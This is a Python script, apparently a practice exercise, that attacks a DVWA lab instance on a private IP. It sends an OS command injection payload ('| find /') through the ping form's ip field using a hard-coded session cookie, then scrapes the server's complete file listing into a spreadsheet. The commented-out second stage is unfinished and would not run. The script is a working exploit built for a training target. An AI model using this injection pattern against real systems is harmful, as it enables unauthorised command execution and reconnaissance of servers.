import requests
from bs4 import BeautifulSoup
from openpyxl import Workbook

PHPSESSID = "7abc41a063ff99c69a837a07352022fe"

def command_injection():
    url = "http://192.168.84.131/dvwa/vulnerabilities/exec/"
    headers = {
        "Cache-Control" : "max-age=0",
        "Origin": "http://192.168.84.131",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://192.168.84.131/dvwa/vulnerabilities/exec/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": f'security=low; PHPSESSID={PHPSESSID}',
    }
    data_front = "ip=%7C+"
    payload_file = "find+%2F"
    payload_directory = "find+%2F"
    data_back = "&submit=submit"

    print("first")
    response = requests.post(url,data=data_front+payload_file+data_back, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    try:
        result = str(soup.find("pre").contents)[:-4]
    except:
        print("soup.find error")
        print(response.text)
        exit()

    result = result.split('\\n')

    write_wb = Workbook()
    write_ws = write_wb.create_sheet('Files')
    write_ws = write_wb.active


    for idx, res in enumerate(result):
        if(idx == 0):
                 continue
        print(res)
        write_ws.cell(idx+1, 1, res)
    
    write_wb.save("files.xlsx")

    # print("second")
    # response = requests.post(url,data=data_front+payload_file+data_back, headers=headers)
    # soup = BeautifulSoup(response.content, "html.parser")
    # try:
    #     result = str(soup.find("pre").contents)[:-4]
    # except:
    #     print("soup.find error")
    #     exit()

    # result = result.split('\\n')
    # for idx, res in enumerate(result):
    #     if(idx == 0):
    #              continue
    #     res_temp = res.split("/")
    #     res_temp = res_temp[0:-1]
    #     res_temp = '/'.join(res)
    #     if(res_temp in result):
             
    #     print(res)
    #    break

    

    



if __name__=="__main__":
    command_injection()
